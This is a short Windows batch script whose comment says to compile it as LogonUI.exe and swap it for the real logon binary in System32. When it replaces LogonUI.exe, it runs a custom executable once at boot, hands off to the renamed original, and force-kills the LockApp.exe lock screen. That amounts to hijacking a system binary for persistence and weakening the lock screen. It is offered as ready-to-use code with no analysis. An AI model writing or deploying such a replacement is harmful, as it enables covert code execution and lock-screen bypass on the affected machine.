Rem AutoExecute on Boot, Compile as LogonUI.exe and replace in Sys32 (also rename the original to LogonUI_o.exe)
@echo off
find "0" C:\ps1_state.txt && (
goto :yay
) || (
goto :end
)
:yay
timeout /t 3
echo 1 > C:\ps1_state.txt
C:\Users\...\tesdt.exe
:end
LogonUI_o.exe %*
taskkill /IM LockApp.exe /F
